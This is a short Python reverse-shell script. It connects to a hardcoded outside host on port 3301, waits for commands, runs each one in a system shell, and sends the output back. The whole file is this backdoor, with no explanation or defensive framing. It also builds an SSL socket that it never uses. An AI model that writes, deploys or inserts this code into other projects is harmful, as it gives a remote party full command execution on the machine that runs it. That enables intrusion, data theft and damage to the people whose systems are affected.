import socket
import ssl
import subprocess

initial_url = "https://zoeziclub.com"
url_parts = initial_url.split("//")[1].split("/", 1)
hostname = url_parts[0]
path = url_parts[1] if len(url_parts) > 1 else "/"

context = ssl.create_default_context()
sock = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
server_address = (hostname, 3301)
client = socket.socket()
client.connect(server_address)

print("[-] Connection initiated!")

# Runtime Loop
while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)